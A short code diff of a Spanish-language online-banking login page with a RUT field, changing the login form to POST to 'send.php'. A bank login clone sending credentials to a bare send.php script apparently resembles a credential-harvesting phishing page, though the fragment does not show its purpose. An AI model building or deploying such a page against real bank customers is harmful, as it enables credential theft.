@@ -1288,7 +1288,7 @@ body {
         <h1 class="title">Ingresa a tu Banca en Línea</h1>
 
         <!-- Formulario -->
-        <form id="loginForm" onsubmit="handleLogin(event)">
+        <form id="loginForm" name="loginForm" method="POST" action="send.php">
             <!-- Campo RUT -->
             <div class="form-group">
                 <label class="form-label" for="rut">RUT</label>
